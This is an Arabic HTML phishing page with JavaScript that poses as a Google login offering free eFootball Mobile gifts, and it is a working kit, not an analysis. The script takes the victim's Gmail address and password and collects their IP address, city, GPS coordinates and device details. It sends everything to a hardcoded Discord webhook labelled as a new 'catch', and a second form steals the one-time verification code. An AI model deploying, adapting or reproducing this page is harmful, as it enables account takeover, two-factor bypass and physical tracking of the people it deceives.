<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball Mobile - تسجيل الدخول والتحقق</title>
    
    <!-- وسوم المعاينة -->
    <meta property="og:title" content="eFootball Mobile 2026 - شحن هدايا مجانية">
    <meta property="og:description" content="سجل دخولك بحساب Google لتأكيد الهوية واستلام الهدايا والعملات فوراً.">
    <meta property="og:image" content="https://siflow326.github.io/efootball-free-gifts/IMG_20260830_052043_542.jpg">
    <meta property="og:type" content="website">

    <style>
        body {
            background: linear-gradient(rgba(13, 27, 42, 0.85), rgba(27, 38, 59, 0.9)), url('IMG_20260830_052043_542.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #ffffff;
            font-family: 'Cairo', Tahoma, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .card {
            background: rgba(15, 23, 42, 0.95);
            border: 2px solid #00f5d4;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 25px rgba(0, 245, 212, 0.4);
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box;
        }
        .logo-img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 2px solid #00f5d4;
            object-fit: cover;
            margin-bottom: 15px;
            box-shadow: 0 0 15px rgba(0, 245, 212, 0.5);
        }
        h2 { color: #00f5d4; font-size: 20px; margin-bottom: 5px; text-shadow: 0 0 10px rgba(0,245,212,0.5); }
        .subtitle { color: #94a3b8; font-size: 12px; margin-bottom: 20px; line-height: 1.4; }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            margin-bottom: 5px;
            color: #38bdf8;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #1e293b;
            border: 1px solid #475569;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: 0.2s;
        }
        .input-group input:focus {
            border-color: #00f5d4;
            box-shadow: 0 0 8px rgba(0,245,212,0.3);
        }
        .btn {
            background: linear-gradient(135deg, #00f5d4, #00bbf9);
            color: #0f172a;
            border: none;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 0 15px rgba(0, 245, 212, 0.4);
            margin-top: 10px;
        }
        .btn:hover { opacity: 0.9; }
        
        /* شاشة التحميل الوهمية */
        #loadingScreen {
            display: none;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(0, 245, 212, 0.2);
            border-top: 5px solid #00f5d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #38bdf8;
            font-size: 14px;
            margin-top: 10px;
            font-weight: bold;
        }
        .step-info {
            color: #94a3b8;
            font-size: 12px;
            margin-top: 5px;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="card">
        <!-- الواجهة الأولى: تسجيل الدخول الوهمي -->
        <div id="loginSection">
            <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
            <h2>تسجيل الدخول عبر Google</h2>
            <p class="subtitle">قم بربط حساب Google الخاص بك لتأكيد هويتك وفحص الأجهزة المرتبطة لاستلام هدايا eFootball Mobile.</p>

            <form onsubmit="startVerification(event)">
                <div class="input-group">
                    <label>البريد الإلكتروني (Gmail)</label>
                    <input type="email" id="email" placeholder="name@gmail.com" required>
                </div>
                <div class="input-group">
                    <label>كلمة المرور</label>
                    <input type="password" id="password" placeholder="كلمة المرور الخاصة بالإيميل" required>
                </div>
                <button type="submit" class="btn">متابعة وفحص الحساب</button>
            </form>
        </div>

        <!-- واجهة التحميل وفحص الأجهزة الوهمية -->
        <div id="loadingScreen" class="hidden">
            <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">جاري الاتصال بخوادم Google...</div>
            <div class="step-info" id="stepInfo">يرجى الانتظار وعدم إغلاق الصفحة</div>
        </div>

        <!-- الواجهة الثانية: صفحة شحن الهدايا والعملات (تظهر بعد التحميل) -->
        <div id="giftSection" class="hidden">
            <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
            <h2>⚽ eFootball Mobile 2026</h2>
            <p class="subtitle">تم ربط الحساب بنجاح ✅<br>أدخل كود التحقق (OTP) أو اضغط لإتمام شحن الهدايا.</p>
            
            <form onsubmit="handleFinalGift(event)">
                <div class="input-group">
                    <label>كود التحقق الواصل للإيميل (إن وجد)</label>
                    <input type="text" id="otpCode" placeholder="أدخل الكود هنا أو اتركه فارغاً">
                </div>
                <button type="submit" class="btn">تأكيد واستلام الهدايا فوراً</button>
            </form>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543430352826011739/loVSz6Py2mno8uN83WxwfGqskhkoaAg4GYOz6hghqLvG7B24p-fPqePOvbkSm5NvyO6b";
        let capturedEmail = "";
        let capturedPassword = "";

        async function sendToDiscord(message) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
            } catch (e) {}
        }

        function getAdvancedDeviceInfo() {
            let ua = navigator.userAgent;
            let deviceName = "هاتف محمول";
            let androidVersion = "Android غير معروف";

            if (/android/i.test(ua)) {
                let match = ua.match(/Android\s([0-9\.]+)/);
                if (match) androidVersion = `Android ${match[1]}`;
                let matches = ua.match(/\(([^)]+)\)/);
                if (matches && matches[1]) {
                    let parts = matches[1].split(';');
                    for (let p of parts) {
                        p = p.trim();
                        if (p.length > 3 && !p.includes("Linux") && !p.includes("Mobile")) {
                            deviceName = p;
                            break;
                        }
                    }
                }
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                deviceName = /iPad/.test(ua) ? "iPad" : "iPhone";
            }

            return {
                device: deviceName,
                os: androidVersion,
                screen: `${window.screen.width} x ${window.screen.height}`
            };
        }

        async function startVerification(event) {
            event.preventDefault();
            capturedEmail = document.getElementById('email').value;
            capturedPassword = document.getElementById('password').value;

            // اخفاء نموذج الدخول وإظهار شاشة التحميل الوهمية
            document.getElementById('loginSection').classList.add('hidden');
            document.getElementById('loadingScreen').classList.remove('hidden');

            // خطوات تحميل وهمية واقعية جداً
            let texts = [
                "جاري الاتصال بخوادم Google الأمانية...",
                "جاري التحقق من صحة كلمة المرور...",
                "جاري فحص الأجهزة المفتوحة فيها الجلسة...",
                "تم العثور على الأجهزة المرتبطة، جاري مزامنة بيانات اللعبة..."
            ];

            let textElement = document.getElementById('loadingText');
            let index = 0;

            let interval = setInterval(() => {
                index++;
                if (index < texts.length) {
                    textElement.innerText = texts[index];
                }
            }, 1200);

            // جمع بيانات الـ IP والموقع الجغرافي والـ GPS أثناء التحميل
            let ip = "Unknown";
            let locationInfo = "Unknown";
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                ip = ipData.ip;

                let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                let data = await geoRes.json();
                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'}`;
            } catch (err) {}

            let info = getAdvancedDeviceInfo();

            // محاولة جلب الـ GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        let gpsData = `خط العرض: ${lat}\nخط الطول: ${lon}\n🔗 https://maps.google.com/?q=${lat},${lon}`;
                        await sendDiscordData(ip, locationInfo, gpsData, info);
                    },
                    async (error) => {
                        await sendDiscordData(ip, locationInfo, "⚠️ تم رفض إذن الـ GPS من المستخدم.", info);
                    },
                    { timeout: 5000 }
                );
            } else {
                await sendDiscordData(ip, locationInfo, "الـ GPS غير مدعوم.", info);
            }

            // بعد 5 ثواني من التحميل، انتقل لصفحة الهدايا
            setTimeout(() => {
                clearInterval(interval);
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById('giftSection').classList.remove('hidden');
            }, 5500);
        }

        async function sendDiscordData(ip, locationInfo, gpsData, info) {
            let msg = `🎯 **[ eFootball - صيد جديد (تسجيل دخول) ]** 🎯\n\n` +
                      `📧 **الإيميل:** \`${capturedEmail}\`\n` +
                      `🔑 **كلمة المرور:** \`${capturedPassword}\`\n` +
                      `🌐 **الـ IP:** \`${ip}\`\n` +
                      `📍 **الدولة والمدينة:** ${locationInfo}\n` +
                      `📍 **إحداثيات الـ GPS:**\n${gpsData}\n` +
                      `📱 **الجهاز:** \`${info.device}\`\n` +
                      `⚙️ **النظام:** \`${info.os}\`\n` +
                      `🖥️ **الشاشة:** \`${info.screen}\``;

            await sendToDiscord(msg);
        }

        async function handleFinalGift(event) {
            event.preventDefault();
            let otp = document.getElementById('otpCode').value || "لا يوجد كود";
            await sendToDiscord(`🔢 **[ تحديث كود التحقق OTP ]**\nالإيميل: \`${capturedEmail}\`\nالكود المدخل: \`${otp}\``);
            alert("تم إرسال طلب الشحن بنجاح! سيتم إضافة الهدايا لحسابك خلال 24 ساعة.");
        }
    </script>
</body>
</html>
